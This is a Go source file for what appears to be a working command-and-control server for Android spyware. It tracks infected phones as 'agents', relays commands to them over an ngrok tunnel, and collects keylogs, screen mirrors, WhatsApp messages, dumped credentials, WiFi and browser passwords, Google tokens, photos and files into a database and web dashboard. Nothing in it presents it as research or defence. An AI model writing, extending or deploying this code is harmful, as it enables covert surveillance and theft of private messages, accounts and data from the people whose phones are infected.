package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "log"
    "net"
    "strings"
    "sync"
    "time"
)

type Server struct {
    config   *Config
    db       *Database
    listener net.Listener
    agents   map[string]*Agent
    mutex    sync.RWMutex
    running  bool
}

type Agent struct {
    ID           string                 `json:"id"`
    Conn         net.Conn               `json:"-"`
    Writer       *bufio.Writer          `json:"-"`
    Reader       *bufio.Reader          `json:"-"`
    Device       string                 `json:"device"`
    Android      string                 `json:"android"`
    Manufacturer string                 `json:"manufacturer"`
    ConnectedAt  time.Time              `json:"connected_at"`
    LastSeen     time.Time              `json:"last_seen"`
    Status       string                 `json:"status"`
    Commands     []Command              `json:"commands"`
    Mirroring    bool                   `json:"mirroring"`
    FrameCount   int                    `json:"frame_count"`
    Keylogs      []string               `json:"keylogs"`
    KeylogHistory []string              `json:"keylog_history"`
    WhatsApp     *WhatsAppData          `json:"whatsapp"`
    Metadata     map[string]interface{} `json:"metadata"`
}

type Command struct {
    ID          string    `json:"id"`
    Command     string    `json:"command"`
    Params      string    `json:"params"`
    IssuedAt    time.Time `json:"issued_at"`
    Status      string    `json:"status"`
    Result      string    `json:"result"`
    CompletedAt time.Time `json:"completed_at"`
}

type WhatsAppData struct {
    Capturing    bool     `json:"capturing"`
    Messages     []string `json:"messages"`
    MessageCount int      `json:"message_count"`
    KeyFound     bool     `json:"key_found"`
}

type Message struct {
    Type    string          `json:"type"`
    AgentID string          `json:"agent_id,omitempty"`
    Command string          `json:"command,omitempty"`
    Result  json.RawMessage `json:"result,omitempty"`
    Data    json.RawMessage `json:"data,omitempty"`
    Raw     []byte          `json:"-"`
}

type BeaconData struct {
    ID           string `json:"id"`
    Device       string `json:"device"`
    Android      string `json:"android"`
    Manufacturer string `json:"manufacturer"`
    Timestamp    int64  `json:"timestamp"`
}

func NewServer(config *Config, db *Database) *Server {
    return &Server{
        config:   config,
        db:       db,
        agents:   make(map[string]*Agent),
        running:  true,
    }
}

// ✅ FIXED: Start with ngrok verification
func (s *Server) Start() error {
    listener, err := net.Listen("tcp", s.config.GetAddress())
    if err != nil {
        return fmt.Errorf("failed to start listener: %v", err)
    }
    s.listener = listener

    log.Printf("🚀 C2 Server listening on %s", s.config.GetAddress())
    log.Printf("🌐 Web UI available at http://%s", s.config.GetWebAddress())

    // ✅ VERIFY NGROK CONNECTION AT STARTUP
    VerifyNgrokConnection(s.config)

    // ✅ MONITOR NGROK TUNNEL CHANGES
    go s.monitorNgrokTunnel()

    go StartWebServer(s.config, s)

    for s.running {
        conn, err := listener.Accept()
        if err != nil {
            if s.running {
                log.Printf("Connection accept error: %v", err)
            }
            continue
        }

        log.Printf("📱 New connection from %s", conn.RemoteAddr())
        go s.handleConnection(conn)
    }

    listener.Close()
    return nil
}

func (s *Server) Stop() {
    s.running = false
    if s.listener != nil {
        s.listener.Close()
    }

    s.mutex.Lock()
    defer s.mutex.Unlock()

    for _, agent := range s.agents {
        if agent.Conn != nil {
            agent.Conn.Close()
        }
        s.db.UpdateAgentStatus(agent.ID, "offline")
    }
}

func (s *Server) handleConnection(conn net.Conn) {
    defer func() {
        log.Printf("🔌 Connection closed: %s", conn.RemoteAddr())
        conn.Close()
    }()

    reader := bufio.NewReader(conn)
    writer := bufio.NewWriter(conn)

    var agent *Agent

    log.Printf("📡 Handling connection from %s", conn.RemoteAddr())

    for s.running {
        conn.SetReadDeadline(time.Now().Add(60 * time.Second))

        line, err := reader.ReadString('\n')
        if err != nil {
            if agent != nil {
                log.Printf("Agent %s disconnected: %v", agent.ID, err)
                s.removeAgent(agent.ID)
            } else {
                log.Printf("Connection %s error: %v", conn.RemoteAddr(), err)
            }
            return
        }

        line = strings.TrimSpace(line)
        if line == "" {
            continue
        }

        log.Printf("📨 RAW DATA from %s: %s", conn.RemoteAddr(), line[:min(len(line), 200)])

        if !strings.HasPrefix(line, "{") {
            s.handlePlainText(conn, writer, line, &agent)
            continue
        }

        var tempMsg map[string]interface{}
        if err := json.Unmarshal([]byte(line), &tempMsg); err == nil {
            if agentID, ok := tempMsg["agent_id"].(string); ok && agentID != "" {
                s.db.AddAllResponse(agentID, line)
                log.Printf("💾 All response saved for agent: %s", agentID)
            }
        }

        var beaconData map[string]interface{}
        if err := json.Unmarshal([]byte(line), &beaconData); err == nil {
            if msgType, ok := beaconData["type"].(string); ok && msgType == "beacon" {
                id, _ := beaconData["id"].(string)
                device, _ := beaconData["device"].(string)
                android, _ := beaconData["android"].(string)
                manufacturer, _ := beaconData["manufacturer"].(string)

                if id != "" {
                    log.Printf("📡 Beacon from: %s (device: %s)", id, device)
                    beacon := BeaconData{
                        ID:           id,
                        Device:       device,
                        Android:      android,
                        Manufacturer: manufacturer,
                    }
                    agent = s.handleBeaconV2(conn, writer, beacon)
                    if agent != nil {
                        s.sendPendingCommands(agent)
                    }
                    continue
                }
            }
        }

        var msg Message
        if err := json.Unmarshal([]byte(line), &msg); err != nil {
            log.Printf("❌ Invalid JSON: %v - Data: %s", err, line[:min(len(line), 100)])
            continue
        }
        msg.Raw = []byte(line)

        if msg.AgentID != "" {
            agent = s.getAgentByID(msg.AgentID)
        }

        rawCommand := msg.Command
        if strings.HasPrefix(rawCommand, "{") {
            var cmdObj map[string]interface{}
            if err := json.Unmarshal([]byte(rawCommand), &cmdObj); err == nil {
                if cmd, ok := cmdObj["command"].(string); ok && cmd != "" {
                    log.Printf("📨 Extracted command from JSON: %s", cmd)
                    msg.Command = cmd
                }
            }
        }

        log.Printf("📨 Message type: %s, Agent: %s, Command: %s", msg.Type, msg.AgentID, msg.Command)

        switch msg.Type {
        case "response":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    log.Printf("⚠️ Unknown agent: %s", msg.AgentID)
                    continue
                }
            }
            s.handleResponse(agent, msg)

        case "keylog":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    continue
                }
            }
            s.handleKeylog(agent, msg)

        case "mirror_status":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    continue
                }
            }
            s.handleMirrorStatus(agent, msg)

        case "whatsapp_message":
            if agent == nil {
                agent = s.getAgentByID(msg.AgentID)
                if agent == nil {
                    log.Printf("⚠️ Unknown agent for whatsapp message: %s", msg.AgentID)
                    continue
                }
            }
            s.handleWhatsAppMessage(agent, msg)

        default:
            log.Printf("⚠️ Unknown message type: %s from %s", msg.Type, msg.AgentID)
        }
    }
}

// ✅ NEW: Monitor ngrok tunnel changes
func (s *Server) monitorNgrokTunnel() {
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    for range ticker.C {
        if !s.running {
            break
        }

        host, port := getNgrokTunnel()
        
        // If there's a change, update config
        if host != "" && port > 0 {
            if s.config.NgrokHost != host || s.config.NgrokPort != port {
                log.Printf("🔄 Ngrok tunnel changed: %s:%d (was: %s:%d)", 
                    host, port, s.config.NgrokHost, s.config.NgrokPort)
                s.config.NgrokHost = host
                s.config.NgrokPort = port
                SaveConfig(s.config)
                
                // Broadcast update to all agents
                s.BroadcastTunnelUpdate(host, port)
            }
        }
    }
}

// ✅ NEW: Broadcast tunnel update to agents
func (s *Server) BroadcastTunnelUpdate(host string, port int) {
    s.mutex.RLock()
    defer s.mutex.RUnlock()

    for _, agent := range s.agents {
        updateMsg := map[string]interface{}{
            "type": "tunnel_update",
            "data": map[string]interface{}{
                "host": host,
                "port": port,
            },
        }
        
        if agent.Writer != nil {
            msgBytes, _ := json.Marshal(updateMsg)
            msgBytes = append(msgBytes, '\n')
            agent.Writer.Write(msgBytes)
            agent.Writer.Flush()
            log.Printf("📤 Tunnel update sent to agent: %s", agent.ID)
        }
    }
}

// ==================== HANDLER METHODS ====================

func (s *Server) handlePlainText(conn net.Conn, writer *bufio.Writer, text string, agent **Agent) {
    log.Printf("📝 Plain text: %s", text)
}

func (s *Server) handleResponse(agent *Agent, msg Message) {
    log.Printf("✅ Response from %s: %s", agent.ID, msg.Command)
    
    var result map[string]interface{}
    if err := json.Unmarshal(msg.Result, &result); err != nil {
        log.Printf("⚠️ Failed to parse response: %v", err)
        return
    }

    switch msg.Command {
    case "screenshot":
        s.handleScreenshot(agent, result)
    case "keylog":
        s.handleKeylogResponse(agent, result)
    case "dump_credentials":
        s.handleDumpCredentials(agent, result)
    case "wifi_passwords":
        s.handleWifiPasswords(agent, result)
    case "gallery":
        s.handleGallery(agent, result)
    case "browser_passwords":
        s.handleBrowserPasswords(agent, result)
    case "google_tokens":
        s.handleGoogleTokens(agent, result)
    case "get_accounts":
        s.handleGetAccounts(agent, result)
    case "get_google_accounts":
        s.handleGetGoogleAccounts(agent, result)
    case "files_list":
        s.handleFilesListResponse(agent, result)
    case "download_file":
        s.handleDownloadFileResponse(agent, result)
    default:
        log.Printf("📊 Response: %s -> %v", msg.Command, result)
    }

    s.db.AddResponse(agent.ID, msg.Command, string(msg.Result))
}

func (s *Server) handleKeylog(agent *Agent, msg Message) {
    var keylogData map[string]interface{}
    if err := json.Unmarshal(msg.Data, &keylogData); err != nil {
        log.Printf("⚠️ Failed to parse keylog: %v", err)
        return
    }

    BroadcastKeylog(agent.ID, keylogData)
    s.db.AddKeylog(agent.ID, string(msg.Data))
}

func (s *Server) handleMirrorStatus(agent *Agent, msg Message) {
    var status map[string]interface{}
    if err := json.Unmarshal(msg.Data, &status); err != nil {
        log.Printf("⚠️ Failed to parse mirror status: %v", err)
        return
    }

    if mirroring, ok := status["mirroring"].(bool); ok {
        agent.Mirroring = mirroring
    }
    BroadcastAgentUpdate(agent)
}

func (s *Server) handleWhatsAppMessage(agent *Agent, msg Message) {
    log.Printf("💬 WhatsApp message from %s", agent.ID)
    
    var waData map[string]interface{}
    if err := json.Unmarshal(msg.Data, &waData); err != nil {
        log.Printf("⚠️ Failed to parse WhatsApp data: %v", err)
        return
    }

    s.db.AddWhatsAppMessage(agent.ID, string(msg.Data))
    BroadcastResponse(agent.ID, "whatsapp", waData)
}

func (s *Server) handleBeaconV2(conn net.Conn, writer *bufio.Writer, beacon BeaconData) *Agent {
    log.Printf("🔍 Processing beacon: %s", beacon.ID)

    agent := s.getAgentByID(beacon.ID)
    if agent != nil {
        log.Printf("✅ Agent %s already exists, updating connection", beacon.ID)
        agent.Conn = conn
        agent.Reader = bufio.NewReader(conn)
        agent.Writer = writer
        agent.LastSeen = time.Now()
        agent.Status = "online"
    } else {
        log.Printf("✨ New agent: %s", beacon.ID)
        agent = &Agent{
            ID:           beacon.ID,
            Conn:         conn,
            Writer:       writer,
            Reader:       bufio.NewReader(conn),
            Device:       beacon.Device,
            Android:      beacon.Android,
            Manufacturer: beacon.Manufacturer,
            ConnectedAt:  time.Now(),
            LastSeen:     time.Now(),
            Status:       "online",
            Commands:     []Command{},
            Keylogs:      []string{},
            KeylogHistory: []string{},
            Metadata:     make(map[string]interface{}),
        }
        s.addAgent(agent)
    }

    s.db.AddAgent(agent.ID, beacon.Device, beacon.Android, beacon.Manufacturer)
    BroadcastAgentUpdate(agent)
    return agent
}

func (s *Server) sendPendingCommands(agent *Agent) {
    log.Printf("📋 Checking pending commands for %s", agent.ID)
    // Implementation would depend on database
}

func (s *Server) handleScreenshot(agent *Agent, result map[string]interface{}) {
    log.Printf("📸 Screenshot from %s", agent.ID)
    if data, ok := result["data"].(string); ok {
        BroadcastFrame(agent.ID, map[string]interface{}{
            "data": data,
        })
    }
}

func (s *Server) handleKeylogResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("⌨️ Keylog response from %s", agent.ID)
    BroadcastKeylog(agent.ID, result)
}

func (s *Server) handleDumpCredentials(agent *Agent, result map[string]interface{}) {
    log.Printf("🔐 Credentials dump from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if data, ok := result["data"].([]interface{}); ok {
            log.Printf("🔐 Found %d credential categories", len(data))
            
            agent.Metadata["credentials"] = result
            s.db.UpdateAgentMetadata(agent.ID, "credentials", result)
            
            BroadcastCredentials(agent.ID, result)
        }
    }
}

func (s *Server) handleWifiPasswords(agent *Agent, result map[string]interface{}) {
    log.Printf("📶 WiFi passwords from %s", agent.ID)
    
    if data, ok := result["data"].([]interface{}); ok {
        log.Printf("📶 Found %d WiFi networks with passwords", len(data))
        
        agent.Metadata["wifi_passwords"] = result
        s.db.UpdateAgentMetadata(agent.ID, "wifi_passwords", result)
        
        BroadcastWifiPasswords(agent.ID, result)
    }
}

func (s *Server) handleGallery(agent *Agent, result map[string]interface{}) {
    log.Printf("🖼️ Gallery response from %s", agent.ID)
    if count, ok := result["count"].(float64); ok {
        log.Printf("🖼️ Total images: %d", int(count))
    }
    
    BroadcastGallery(agent.ID, result)
}

func (s *Server) handleBrowserPasswords(agent *Agent, result map[string]interface{}) {
    log.Printf("🌐 Browser passwords from %s", agent.ID)
    agent.Metadata["browser_passwords"] = result
    s.db.UpdateAgentMetadata(agent.ID, "browser_passwords", result)
}

func (s *Server) handleGoogleTokens(agent *Agent, result map[string]interface{}) {
    log.Printf("🔵 Google tokens from %s", agent.ID)
    agent.Metadata["google_tokens"] = result
    s.db.UpdateAgentMetadata(agent.ID, "google_tokens", result)
}

func (s *Server) handleGetAccounts(agent *Agent, result map[string]interface{}) {
    log.Printf("👤 Accounts from %s", agent.ID)
    BroadcastAccounts(agent.ID, result)
}

func (s *Server) handleGetGoogleAccounts(agent *Agent, result map[string]interface{}) {
    log.Printf("🔵 Google accounts from %s", agent.ID)
    BroadcastGoogleAccounts(agent.ID, result)
}

func (s *Server) handleFilesListResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("📁 Files list response from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if count, ok := result["count"].(float64); ok {
            log.Printf("📁 Total files: %d", int(count))
        }
        s.db.AddFilesList(agent.ID, result)
    }
}

func (s *Server) handleDownloadFileResponse(agent *Agent, result map[string]interface{}) {
    log.Printf("⬇️ Download response from %s", agent.ID)
    
    if status, ok := result["status"].(string); ok && status == "success" {
        if filename, ok := result["filename"].(string); ok {
            size := result["size"]
            log.Printf("⬇️ File downloaded: %s (%v bytes)", filename, size)
        }
        s.db.AddDownloadedFile(agent.ID, result)
    }
}

// ==================== AGENT MANAGEMENT ====================

func (s *Server) addAgent(agent *Agent) {
    if agent == nil || agent.ID == "" {
        return
    }

    s.mutex.Lock()
    defer s.mutex.Unlock()

    // Check for duplicates
    if _, exists := s.agents[agent.ID]; exists {
        log.Printf("⚠️ Agent %s already exists, skipping duplicate", agent.ID)
        return
    }

    s.agents[agent.ID] = agent
    log.Printf("📊 Total agents: %d", len(s.agents))
    BroadcastAgentUpdate(agent)
}

func (s *Server) removeAgent(agentID string) {
    s.mutex.Lock()
    defer s.mutex.Unlock()
    if agent, ok := s.agents[agentID]; ok {
        agent.Status = "offline"
        s.db.UpdateAgentStatus(agentID, "offline")
        delete(s.agents, agentID)
        log.Printf("📊 Total agents: %d", len(s.agents))
        BroadcastAgentUpdate(agent)
    }
}

func (s *Server) getAgentByID(id string) *Agent {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    return s.agents[id]
}

func (s *Server) GetAgents() []*Agent {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    agents := make([]*Agent, 0, len(s.agents))
    for _, agent := range s.agents {
        agents = append(agents, agent)
    }
    return agents
}

func (s *Server) SendCommand(agentID, command, params string) (string, error) {
    agent := s.getAgentByID(agentID)
    if agent == nil {
        return "", fmt.Errorf("agent not found")
    }

    cmdID := generateID()
    fullCommand := command
    if params != "" {
        fullCommand = command + " " + params
    }

    cmd := Command{
        ID:        cmdID,
        Command:   fullCommand,
        Params:    params,
        IssuedAt:  time.Now(),
        Status:    "pending",
    }

    s.db.AddCommand(agentID, cmd)

    cmdJSON, _ := json.Marshal(map[string]interface{}{
        "command": fullCommand,
        "id":      cmdID,
    })

    agent.Writer.WriteString(string(cmdJSON) + "\n")
    agent.Writer.Flush()

    cmd.Status = "sent"
    s.db.UpdateCommandStatus(cmdID, "sent")

    log.Printf("📤 Command sent to %s: %s", agentID, fullCommand)
    return cmdID, nil
}

// ==================== UTILITY ====================

func generateID() string {
    return fmt.Sprintf("%d_%s", time.Now().UnixNano(), randomString(8))
}

func randomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[time.Now().UnixNano()%int64(len(letters))]
    }
    return string(b)
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}
